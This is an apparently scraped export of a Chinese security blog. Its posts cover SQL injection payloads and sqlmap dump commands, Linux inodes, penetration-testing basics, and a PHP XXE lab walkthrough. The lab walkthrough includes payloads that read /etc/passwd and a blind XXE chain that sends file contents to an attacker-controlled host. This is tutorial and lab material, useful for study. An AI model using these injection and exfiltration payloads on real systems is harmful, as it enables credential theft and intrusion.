12Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)Payload: id=1' AND (SELECT 6181 FROM(SELECT COUNT(*),CONCAT(0x716b7a7171,(SELECT (ELT(6181=6181,1))),0x7176626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'WtBf'='WtBf Type: time-based blind 12Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)Payload: id=1' AND (SELECT 4715 FROM (SELECT(SLEEP(5)))dSPj) AND 'POnp'='POnp 初步检测得到DBMS为MySQL，且后端版本不在5.0版本之下； 爆数据库名python sqlmap.py -u &quot;URL?id=1&quot; --dbs 得到如上8个数据库； 爆表名python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; --tables以“security”为例： 得到4 tables； 爆字段python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot; --columns 得到3 columns； 爆内容python sqlmap.py -u &quot;URL?id=1&quot; -D &quot;dbname&quot; -T &quot;table_name&quot; -C &quot;id,username,password&quot; --dump 得到13 entries；+++ 方法3：时间延迟注入(time-based blind)正确延迟，错误不延时； 爆库 库长 1?id=1' and if(length(database())=8,sleep(5),1)--+ 根据浏览器刷新的延迟程度，可以判断库长为8； 库名 1?id=1' and if(left(database(),1)='s',sleep(5),1)--+ 1?id=1' and if(left(database(),2)='se',sleep(5),1)--+ 爆表 1?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),1)-- 第一个表首字母为’e’; 爆字段 1?id=1' and if(mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password',sleep(5),1) --+ 爆内容 1?id=1' and if(substr((select password from users limit 0,1),1,1)='d',sleep(5),1) --+ …… 由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述； 方法4：报错注入(error-based)补充： 常用函数 函数语法 解释 用法 CONCAT( string1, string2 ) CONCAT函数返回string1连接string2后的一个字符串值。如果有任何一个参数为null，则返回值为null； SELECT CONCAT(CONCAT(&#39;A&#39;, &#39;B&#39;),&#39;C&#39;) FROM dual;– Result: ‘ABC’123456789101112131415| `FLOOR(x)` | 返回小于等于输入的数的整数; | `SELECT floor(3.1415926);`--Result: 3 || `RAND()` | 产生0和1之间的一个随机数； | `RAND();`--Result: 0.1824410643265 || `COUNT(expression)` | 用于检索表达式或给定列的行数; | `SELECT COUNT(aggregate_expression) FROM tables [WHERE conditions];` || `GROUP BY` | 协作 SELECT语句相同的数据成组以便安排; | `SELECT column-list FROM table_name WHERE [ conditions ] GROUP BY column1, column2....columnN ORDER BY column1, column2....columnN` |+++**使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。**构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。1. 查看版本信息```sql?id=-1&apos;union select count(*),count(*), concat(&apos;~&apos;,(select version()),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a --+ 注：加入’~’是为了明显区分查询内容，防止加入其他连接进的字符串； 爆库 1?id=-1'union select count(*),count(*), concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a --+ 爆用户 1?id=-1' union select count(*),count(*), concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+ 爆表 1?id=-1' union select count(*),1, concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 通过修改limit x,1 遍历表名; 爆字段 1?id=-1' union select count(*),count(*), concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 爆内容 1?id=-1' union select count(*),count(*), concat('~',(select concat_ws(':',password,username) from users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 修改limit x,1 以更改爆出第x个用户的password和username （‘[’是分隔符）； 注： concat() 连接字符串的时候，只要其中一个是NULL，那么将返回NULL concat_ws() 连接字符串的时候，只要有一个字符串不是NULL，就不会返回NULL。(concat_ws函数需要指定分隔符) END","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"Linux 的节点 inode","slug":"2020-03-11-Linux-的节点-inode","date":"2020-03-11T11:29:23.000Z","updated":"2020-03-12T09:21:51.677Z","comments":true,"path":"2020/03/11/2020-03-11-Linux-的节点-inode/","link":"","permalink":"https://singlemindedt.github.io/2020/03/11/2020-03-11-Linux-的节点-inode/","excerpt":"","text":"WHO?文件数据储存在硬盘中，硬盘最小的储存单元为“扇区”（一个扇区512字节）。操作系统读取硬盘时，为提高读取效率，一次性读取多个扇区，这些扇区组成“块”(即block，是文件存取的最小单位，一般为4KB，即连续8个扇区组成一个block；)文件都储存在“块”中，那么还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。每个存储设备(如硬盘)或存储设备的分区被格式化为文件系统后，有两部分内容，一部分为inode，另一部分为block。block用来存储数据，inode用来存储数据的信息(如文件大小、属性、归属的用户组、读写权限等)。inode为每个文件进行信息索引，因此有了inode的数值。操作系统根据指令，能通过inode值找到相对应的文件。 Inode内容 文件的字节数 文件拥有者的User ID 文件的Group ID 文件的读、写、执行权限 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 链接数，即有多少文件名指向这个inode 文件数据block的位置使用stat 文件名命令，可以查看文件的inode信息： 这是一个新建的空的txt文本文件； Inode大小与数量inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域：一个是数据区（data area），存放block；另一个是inode区（也交inode表，inode table），存放inode。inode节点的大小，一般为128B或256B。inode节点的数目，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。使用df -i可以查看每个硬盘分区的inode总数和已经使用的数量： 注：由于inode是有限个的，而每个文件又有一个inode，因此产生现象：硬盘还未存满，但inode节点已经用光，导致硬盘上无法创建新文件。查看每个inode节点大小，可以使用sudo dumpe2fs -h /dev/hda | grep &quot;Inode size&quot; Inode number每个inode都有一个号，类似身份证号，Unix/Linux操作系统内部不使用文件名，而是用inode number来识别文件。文件名只是inode number便于识别的别称或绰号。表面上，用户通过文件名打开文件；实际上，系统内部分三步完成这一过程： 找到文件名对应的inode number（内存）。 通过inode number，获取inode内容（磁盘）。 最后，根据inode内容，找到文件数据存储的所有block，读出数据（磁盘）。使用ls -i命令，可以看到文件名对应的inode number： 目录文件** Linux系统中，一切皆文件。**Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所含文件的文件名，以及该文件名对应的inode number。ls列出目录文件中的所有文件名： ls -i列出整个目录文件，包括文件名对应的inode number； ls -l可查看文件的详细信息(即根据inode number，访问inode节点)： 根据以上内容对目录权限的理解应有以下： 目录文件的读权限(r)和写权限(w)针对目录文件本身； 而目录文件中只有文件名和inode number，若是想得到文件的详细信息，就必须经过inode节点，当只有读权限时，用户仅能得到文件名等基本信息，而读取inode索引节点内的信息需要用户拥有目录文件的执行权限(x)。 硬链接一般情况，文件名和inode number是一一对应的，每个inode number对应一个文件名。但是，Unix/Linux系统允许多个文件名指向同一个inode number。那么就会产生可以通过不同文件名来访问相同文件；对文件内容修改会影响所用相同inode number指向的文件名；删除其中一个文件名不影响其他文件名对文件的访问的情况。即称为“硬链接”。 ln 源文件 目标文件命令创建硬链接：[8]:() 首列是inode number，第3列表示指向该inode节点的文件名的数量，即链接数。可以看到在创建之前只用两个文件test0.txt和timg.jpeg，并且它们的链接数量均为1；创建后，多出文件test1.txt,且test0.txt和 test1.txt的inode number均为4458874，链接数量也显示为2。注：创建目录时，默认会生成两个目录项：”.”和”..”。“.”的inode number即为当前目录的inode number，相当于当前目录的一个硬链接；“..”的inode number即为当前目录的父目录的inode number，相当于父目录的一个硬链接。故任何一个目录的硬链接总数，总是等于2加上它的子目录总数（含隐藏目录）。 软连接软链（soft link，或称符号链接symbolic link）指，如果文件A软链指向文件B，则标记文件A为软链文件，并在文件A中记录文件B的路径。此时，文件A与文件B的inode number号码不同。系统读取文件A时，根据A是软连接会自动将访问者导向文件B，即最终均访问B。相交对于读、修改操作，硬链接与软连接实现的效果相同。但删除（包括rename）操作上表现不同： 如果删除文件A，则文件B无影响； 如果删除文件B，则文件A依然存在，但访问文件A时会报错；ln -s 源文件 目标文件创建软链接： 可以看到第4行中test2.txt高亮并有箭头指向test1.txt。软链接test2.txt和源文件test1.txt所拥有的inode number不一样，即软链接是新建了一个文件，而该文件指向源文件，并非源inode 节点。 参考文献:1.Linux公社2.Blog03.Blog14.百科5.Blog2","categories":[],"tags":[]},{"title":"渗透测试基础","slug":"2020-03-03-渗透测试基础","date":"2020-03-03T02:15:57.000Z","updated":"2020-08-01T08:50:15.380Z","comments":true,"path":"2020/03/03/2020-03-03-渗透测试基础/","link":"","permalink":"https://singlemindedt.github.io/2020/03/03/2020-03-03-渗透测试基础/","excerpt":"","text":"+++渗透测试是对网站和服务器的全方位安全测试，通过模拟黑客攻击的手法，切近实战，提前检查网站的漏洞，然后进行评估形成安全报告。 +++ 前期交互阶段(确定渗透测试的范围和目标) +++ 情报搜集阶段40%-60%all time 目标选择 隐私收集 踩点工作 验证目标的安全机制 +++ 威胁建模阶段(分析，确定最佳攻击方式，确定安全威胁) +++ 漏洞分析阶段 三种机制：测试、验证、研究； +++ 渗透攻击阶段 可以利用以前漏洞分析阶段的成果，是真正的攻击阶段; +++ 后渗透攻击阶段(客户关心的价值) 包括了当成功渗透攻击到对方计算机以后的很多任务，比如提权、上传和下载文件、跳板攻击等 以特定的业务系统为目标，识别出关键基础设施，并寻找客户最有价值的资产 +++ 报告阶段 确定目标最为重要的威胁 将渗透测试得到的数据生成表格和图表 对目标系统的改进建议 对问题的修复方案 报告举例：offensive-security +++ 某公司安全渗透介绍： 渗透测试范围和内容 网站安全渗透包括，SQL注射漏洞，cookies注入漏洞，文件上传截断漏洞，目录遍历漏洞，URL跳转漏洞，在线编辑器漏洞，网站身份验证过滤漏洞，PHP远程代码执行漏洞，数据库暴库漏洞，网站路径漏洞，XSS跨站漏洞，默认后台及弱口令漏洞，任意文件下载漏洞，网站代码远程溢出漏洞，修改任意账号密码漏洞，程序功能上的逻辑漏洞，任意次数短信发送、任意手机号码或邮箱注册漏洞后台或者api接口安全认证绕过漏洞等等的安全渗透测试。 服务器安全渗透包括，内网渗透，FTP提权漏洞，SQL Server数据库提权，Mysql提权漏洞，linux本地溢出漏洞，替换系统服务漏洞，远程桌面认证绕过漏洞，端口映射漏洞，CC压力测试，DDOS压力测试，arp欺骗篡改页面测试，DNS欺骗漏洞，会话劫持漏洞，以及虚拟主机等众多应用程序系统的漏洞测试。 SQL注入: 检测网站是否存在SQL注入漏洞，如：INT型注入和String型注入，盲注、报错注入、编码宽字节注入、二次Urldecode注入、如果存在该漏洞，攻击者对注入点进行注入攻击，注入攻击是对数据库直接操作，可轻易获得网站的后台管理权限，甚至网站服务器的管理权限。并可能导致用户资料泄露。重要的敏感信息泄漏，SQL 注入可获取大量企业核心业务数据等接口问题引起的敏感信息泄露。 严重的逻辑设计漏洞: 包括批量修改任意账号密码漏洞、提现密码任意修改，撤单漏洞，订单篡改漏洞，找回密码漏洞，任意查询用户信息漏洞（姓名，手机号，邮箱，身份证），银行卡号信息任意更改，任意次数短信发送、任意手机号码或邮箱注册漏洞，账号普通越权操作修改其他用户密码，绕过限制修改用户资料、执行用户操作等，后台或者api接口安全认证绕过漏洞涉及企业核心业务的逻辑漏洞。 直接获取系统权限的漏洞: （服务器权限、客户端权限）包括远程命令执行、任意代码执行、上传获取Webshell、SQL注入获取系统权限、缓冲区溢出（包括可利用的ActiveX缓冲区溢出）敏感信息越权访问，包括但不仅限于绕过认证直接访问管理后台、重要后台弱密码、获取大量内网敏感信息的SSRF等。 文件上传操作漏洞: 检测网站的上传功能是否存在上传漏洞，包含move_uploaded_file()上传函数测试有没有安全过滤，文件头、content_type验证绕过，绕过上传文件格式（asp,php,jsp.等脚本文件），绕过上传的目录，文件操作漏洞（文件包含漏洞，本地文件包含，远程文件包含，文件包含截断，任意文件读取，文件任意删除漏洞）如果存在此漏洞，攻击者可直接利用该漏洞上传木马从而在网站上获取Webshell并进而控制网站，也可以破坏网站，危害较严重。。 XSS跨站漏洞： 检测网站是否存在反射性XSS，存储性XSS漏洞，XXS漏洞经常出现在文章发表，评论回复，留言，个人资料设置，发送信件，注册资料等等程序功能上，常用的输入函数列表：print、print_r、echo、printf、sprintf、die、var-dump、var_export，等函数列表里进行漏洞测试，XSS跨站攻击，会窃取用户cookies、利用CSRF漏洞进行跨站请求伪造，劫持用户或者管理员的身份进行网站提权，上传木马后门，添加管理员账号，修改网站配置。 源代码泄露: 检测网站是否存在源代码泄露漏洞，如果存在此漏洞，攻击者可直接下载网站的源代码。并获取网站的数据库密码以及管理密码。检测网站的某些隐藏目录是否存在泄露漏洞。如果存在此漏洞，攻击者可了解网站的全部结构。普通信息泄漏。包括客户端明文存储密码、以及web路径遍历、系统路径遍历等。 普通的测试服务和漏洞扫描工具只能发现常规性的漏洞，而对于系统深层次的漏洞和业务逻辑漏洞一般扫描器是无法探测到的，因此需要选择人工安全渗透测试服务来对业务系统做更深层次、更全面的安全检查。 安全评估报告· 根据不同的渗透测试结果，形成一套完整的安全报告。报告出所发现的最新漏洞以及修复方案。· 根据发现的漏洞，分三个风险级别，高危，中等，低危三个等级。· 我们不做黑客攻击，在洽谈合作时,需要提供网站和服务器的所有权证明。 +++ 渗透测试的本质就是信息收集（侯亮Micro8） 漏洞库：exoloit.db inurl:t.me 社工库 （telegram不安全） IIS（ Windows概念） WSL Docker wappalyzer webrobot目录扫描 ***的隐藏密码可以改变检查中type=“password”为type=”任意字符“来获取密码 ## google： 通配符* 逻辑非- 2333 -习近平 去除百度右边广告 site:baidu.com扫资产 intitle:后台登录 inurl:url 关键字 shodan搜索引擎 找同模板的网站，看logo，间接渗透； 网站icu搞流量； ssr代理； 证书反查； 邮件查看IP，点击显示邮件原文；","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"XML & DTD","slug":"2020-03-1-XML&DTD","date":"2020-03-01T02:00:08.000Z","updated":"2020-04-25T16:32:48.164Z","comments":true,"path":"2020/03/01/2020-03-1-XML&DTD/","link":"","permalink":"https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/","excerpt":"","text":"XML简介 XML 指可扩展标记语言（EXtensible Markup Language）。 XML 被设计用来结构化、传输和存储数据。(HTML被设计用于显示数据) XML没有预定义的标签，需自行定义。 XML 被设计为具有自我描述性 XML结构XML文档包含： XML声明 DTD文档类型定义(可选) 文档元素 XML文档可看作是一种树结构，由树根—&gt;树叶； 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- 定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言） --&gt;&lt;note&gt;&lt;to&gt;Alice&lt;/to&gt;&lt;from&gt;Bob&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;I miss you !&lt;/body&gt;&lt;/note&gt; XML元素XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。一个元素可以包含：其他元素、文本、属性、或混合前几种元素注意： 元素标记区分大小写 &lt;Name&gt; ≠&lt;name&gt;; XML元素标记命名规则: 可以包含字母，数字及其它字符,不能以数字、下划线等标点符号开头; 不能包含空格 不能以字母 xml（或者 XML、Xml 等等）开始 xml有且只有一个根元素，根元素的起始标记要放在所有其它元素起始标记之前，根元素的结束标记根放在其它所有元素的结束标记之后。 XML语法XML属性属性值必须加引号 XML注释与HTML一致：&lt;!--This is comment --&gt; 实体引用字符实体由于XML中部分符号具有特殊意义，为避免解析器解析错误，以实体引用代替部分字符； 在 XML 中，有 5 个预定义的实体引用： &amp;lt; &lt; &amp;gt; &gt; &amp;amp; &amp; &amp;apos; ‘ &amp;quot; “ — 命名实体 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ELEMENT A \"i\"&gt;&lt;!ELEMENT B \"am\"&gt;&lt;!ELEMENT C \"hacker\"&gt;]&gt;&lt;root&gt; &lt;A&gt;&amp;A;&lt;/A&gt; &lt;B&gt;&amp;B;&lt;/B&gt; &lt;C&gt;&amp;C;&lt;/C&gt;&lt;/root&gt; 参数实体combine.dtd 1&lt;!ENTITY content &quot;%parameterA;%parameterB;%parameterC;&quot;&gt; xml 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ELEMENT % parameterA \"i\"&gt;&lt;!ELEMENT % parameterB \"am\"&gt;&lt;!ELEMENT % parameterC \"hacker\"&gt;&lt;!ENTITY dtd SYSTEM \"combine.dtd\"&gt;%dtd;]&gt;&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt; 引用格式： 参数实体 %parameter_name 其他实体 &amp;name 外部实体12345&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY outfile SYSTEM \"outfile.xml\"&gt;]&gt;&lt;root&gt;&lt;outfile&gt;&amp;outfile&lt;/outfile&gt;&lt;/root&gt; XXE漏洞一般发生在应用程序解析XML输入时，没有处理好外部实体的加载； +++ DTD DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 1.内部的DOCTYPE声明 &lt;!DOCTYPE root-element [element-declarations]&gt;即&lt;!DOCTYPE 根元素 [元素声明]&gt;例： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE note[ &lt;!--定义此文档为note类型--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义元素的类型为#PCDATA--&gt;]&gt;&lt;note&gt;&lt;to&gt;Alice&lt;/to&gt;&lt;from&gt;Bob&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;I miss you !&lt;/body&gt;&lt;/note&gt; 2.外部文档声明 &lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;即&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 或&lt;!DOCTYPE root-element PUBLIC &quot;public_ID&quot; &quot;filename&quot;&gt; 即&lt;!DOCTYPE 根元素 PUBLIC &quot;文件源&quot; &quot;文件名&quot;&gt; 声明元素在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：&lt;!ELEMENT element-name category&gt; 或 XXE原理XXE即XML外部实体注入。简单解释可看成两个部分： 注入XML数据在传输过程中被恶意修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的； 外部实体为达到注入（修改）XML数据的目的，攻击者通过外部实体声明声明部分对XML数据进行修改，完成恶意注入； ** XXE漏洞是由xml解析器配置不安全，解析器本身并不分析实体是否为恶意内容，仅检查xml文件是否有结构上的错误。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。** 关于：[XXE-PHP Audit Basic](https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/) ++++","categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://singlemindedt.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://singlemindedt.github.io/tags/DTD/"}]},{"title":"XXE-PHP Audit Basic","slug":"XXE-PHP Audit Basic","date":"2020-02-29T10:20:08.000Z","updated":"2020-03-02T13:25:17.798Z","comments":true,"path":"2020/02/29/XXE-PHP Audit Basic/","link":"","permalink":"https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/","excerpt":"","text":"搭建XXE-PHP Audit Basic 环境XXE-PHP Audit Basic1. GitHub项目页Vulnspy提供了在线运行环境，单击Vsplate GO&gt;按钮可以创建在线环境，直接在上面操作即可； +++2. 将XXE-PHP Audit Basic文件下载下来解压至Phpstudy2018\\PHPTutorial\\WWW目录下； 开启Phpstudy2018的Apache和MySql服务; 访问http://127.0.0.1/phpaudit-XXE-master/ 即可； XXE漏洞(XML External Entity,XML外部实体注入攻击)：如果可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。 关于XML,相关题目 :smile:","categories":[],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://singlemindedt.github.io/tags/XXE/"}]},{"title":"XXE-PHP Audit Basic详解","slug":"2020-02-29-XXE-PHP Audit Basic详解","date":"2020-02-29T10:20:08.000Z","updated":"2020-05-15T00:25:39.566Z","comments":true,"path":"2020/02/29/2020-02-29-XXE-PHP Audit Basic详解/","link":"","permalink":"https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP Audit Basic详解/","excerpt":"","text":"[TOC][5]:() 1.DOMDocument.php点开链接，有如下xml代码： 简单的定义了一个外部实体content，通过file协议来读取服务器端本机的文件（此处读取的文件为etc/passwd）； PHP中可以通过FILE协议、HTTP协议和FTP协议读取文件；xml文件使用PHP解析，故还可利用PHP伪协议; 在使用file://协议时，有以下几种格式： 123456789101112file：//host/path* Linux file:///etc/passwd* Unix file://localhost/etc/fstab file:///localhost/etc/fstab* Windows file:///c:/windows/win.ini file://localhost/c:/windows/win.ini* （下面这两种在某些浏览器里是支持的） file:///c|windows/win.ini file://localhost/c|windows/win.ini XML在各语言下支持的协议有: 查看源文件： 1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); var_dump($dom); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; isset($_POST[&#39;data&#39;])检查$_POST[&#39;data&#39;]是否存在，存在返回true，不存在返回false； $_POST[&#39;data&#39;]获得POST传值； +++ 源码解释:+++ libxml_disable_entity_loader(false);#禁用加载外部实体的功能 参数： 禁用（TRUE）或启用（FALSE）libxml扩展（例如 DOM,XMLWriter和XMLReader）以加载外部实体。+++ $data = isset($_POST[&#39;data&#39;])?trim($_POST[&#39;data&#39;]):&#39;&#39;; #isset($_POST[&#39;data&#39;])若存在（不为空），则返回去除空格后的$_POST[&#39;data&#39;]；否则返回空值。并将结果赋值给$data语法 1bool isset ( mixed $var [, mixed $... ] ) 检测变量是否设置，并且不是 NULL。如果已经使用 unset() 释放了一个变量之后，它将不再是 isset()。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是一个 NULL 字节（”\\0”）并不等同于 PHP 的 NULL 常数。| 参数 | 描述 || :—- | :————- || var | 要检查的变量。 |细节：返回值：如果 var 存在并且值不是 NULL 则返回 TRUE，否则返回 FALSE。 +++ $dom = new DOMDocument(); #实例化一个DomDocument对象； +++ loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。 语法： 1loadXML(text) 参数 描述 text 要解析的 XML 标签。 +++ 5. LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值 LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件 +++ ob_start：打开输出缓冲区函数格式：void ob_start(void)说明：当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。为了输出缓冲区的内容，可以使用ob_end_flush()或flush()输出缓冲区的内容。 ob_get_contents ：返回内部缓冲区的内容。使用方法：string ob_get_contents(void)说明：这个函数会返回当前缓冲区中的内容，如果输出缓冲区没有激活，则返回 FALSE 。 ob_end_clean：删除内部缓冲区的内容，并且关闭内部缓冲区使用方法：void ob_end_clean(void)说明：这个函数不会输出内部缓冲区的内容而是把它删除！ +++ var_dump() 函数用于输出变量的相关信息。 var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。+++ htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 、&gt; 之类的 HTML 字符会被替换为 &amp;lt; 和 &amp;gt;。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。 +++ 概括一下就是，由于该代码未禁用加载外部实体，当我们传入恶意XML文件后，服务器直接对post数据进行xml解析，并加载外部实体，使之读入我们想要得到内容到缓冲区，输出变量相关性息后，将缓冲区内容赋值给其他变量，最终回显变量内容。 构造payload1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt;&lt;/note&gt; 得到目标内容： 2.SimpleXMLElement.php打开链接，页面样式与DOMDocument.php无二，直接来查看源码； 1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = new SimpleXMLElement($data, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; 源码只与DOMDocument.php中新建对象不同； （SimpleXML 函数是 PHP 核心的组成部分。无需安装即可使用这些函数。 DOMDocument 同样也是，DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。 SimpleXML操作xml相对DOMDocument要简单许多，但函数功能较少，适合实现较简单的功能，详情可参见SimpleXML的函数文档，DOMDocument则提供了全面的操作xml函数和属性，适合实现复杂的xml操作。） 构造payload1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt;&lt;/note&gt; 返回目标结果： +++ 3.simplexml_load_string.php1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; simplexml_load_string;#从 XML 字符串获取 SimpleXMLElement 对象（转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素） 语法simplexml_load_string(*data,classname,options,ns,is_prefix*); 参数 描述 data 必需。规定形式良好的 XML 字符串。 classname 可选。规定新对象的 class。 options 可选。规定附加的 Libxml 参数。通过指定选项为 1 或 0（TRUE 或 FALSE，例如 LIBXML_NOBLANKS(1)）进行设置。 +++ 源码与之前关卡没有太大不同，仅改变获取实体的方法。libxml_disable_entity_loader(false);处，未禁止加载外部实体；同时simplexml_load_string允许我们通过DTD来定义外部实体。 构造payload12345&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;abc&gt;&amp;test;&lt;/abc&gt; 得到目标内容： 4.BlindXXE.php查看源码： 12345678910111213141516171819&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT); if($xml &amp;&amp; isset($xml-&gt;name))&#123; $name = $xml-&gt;name; &#125; &#125;?&gt; &lt;?php echo isset($name)?'ok':'error';?&gt; 经过测试发现仅返回ok或error； 源码中也可以看到：echo isset($name)?&#39;ok&#39;:&#39;error&#39;; blind xxe思想就是将数据通过外部服务器或者报错信息带出来; 构造如下payload： 1234567&lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://192.168.40.128/evil.xml\"&gt; %dtd; %send; ]&gt;&lt;abc&gt;&lt;/abc&gt; 解析流程：XML解析器： 首先检查XML版本（依据版本进行解析处理） 检查文档类型定义的DTD（内联DTD） 解析器读取php://filter/convert.base64-encode/resource=/etc/passwd内容 将读取的内容存储到file实体中（用赋值来代替参数实体） dtd为参数实体，它的值为http://192.168.40.128/evil.xml 引用参数实体dtd 引用实体send，而send存在于evil.xml中 +++ 由于在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。 所以，参数实体引用%file;必须放在外部文件里 。 所以我们在自己的服务器上创建evil.xml,并写入如下内容： 12&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.40.128/?content=%file;'&gt;\"&gt; %payload; 注意，因为这里是参数实体payload来嵌套定义参数实体send，所以被嵌套定义的参数实体%一定要HTML编码为：&amp;#x25; 